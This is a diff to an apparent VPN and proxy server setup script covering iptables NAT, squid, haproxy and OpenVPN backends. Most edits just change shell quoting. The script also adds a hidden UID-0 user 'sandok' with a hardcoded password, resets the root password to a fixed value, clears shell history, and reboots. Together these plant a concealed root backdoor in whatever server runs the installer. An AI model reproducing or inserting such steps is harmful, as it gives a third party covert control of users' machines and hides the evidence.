@@ -378,28 +378,28 @@ net.ipv4.icmp_echo_ignore_all = 1' >> /etc/sysctl.conf
 echo '* soft nofile 512000
 * hard nofile 512000' >> /etc/security/limits.conf
 ulimit -n 512000
-SELINUX=disabled 
+echo SELINUX=disabled 
 sysctl -p
 
 iptables -F; iptables -X; iptables -Z
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o enp1s0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o enp1s0 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o ens3 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o ens3 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.20.0.0/16 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o eth0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o eth0 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o eth0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o ens3 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o ens3 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o ens3 -j SNAT --to-source "$(curl ipecho.net/plain)"
 iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o enp1s0 -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o enp1s0 -j SNAT --to-source `curl ipecho.net/plain`
+iptables -t nat -A POSTROUTING -s 172.30.0.0/16 -o enp1s0 -j SNAT --to-source "$(curl ipecho.net/plain)"
 
 
 sudo apt install debconf-utils -y
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | sudo debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo debconf-set-selections
-useradd -p $(openssl passwd -1 alaminalamin) sandok -ou 0 -g 0
+useradd -p "$(openssl passwd -1 alaminalamin)" sandok -ou 0 -g 0
 sudo apt-get install iptables-persistent -y
 iptables-save > /etc/iptables/rules.v4 
 ip6tables-save > /etc/iptables/rules.v6
@@ -407,7 +407,7 @@ ip6tables-save > /etc/iptables/rules.v6
 
 apt-get install squid -y
 echo "http_port 8080
-acl to_vpn dst `curl ipinfo.io/ip`
+acl to_vpn dst $(curl ipinfo.io/ip)
 http_access allow to_vpn 
 via off
 forwarded_for off
@@ -869,19 +869,19 @@ frontend main
 	
 backend openvpn
     mode tcp
-    server openvpn `curl ipecho.net/plain`:1194
+    server openvpn $(curl ipecho.net/plain):1194
 
 backend stunnel
     mode tcp
-    server openvpn-stunnel `curl ipecho.net/plain`:444
+    server openvpn-stunnel $(curl ipecho.net/plain):444
 	
 backend webserver
     mode http
-    server webserver-localhost `curl ipecho.net/plain`:81
+    server webserver-localhost $(curl ipecho.net/plain):81
 	
 backend squid
     mode http
-    server squid-localhost `curl ipecho.net/plain`:80
+    server squid-localhost $(curl ipecho.net/plain):80
 
 " >> /etc/haproxy/haproxy.cfg
 
@@ -906,6 +906,5 @@ clear
 history -c
 echo 'root:@@Alaminbd257' | sudo chpasswd
 reboot
-
 
 
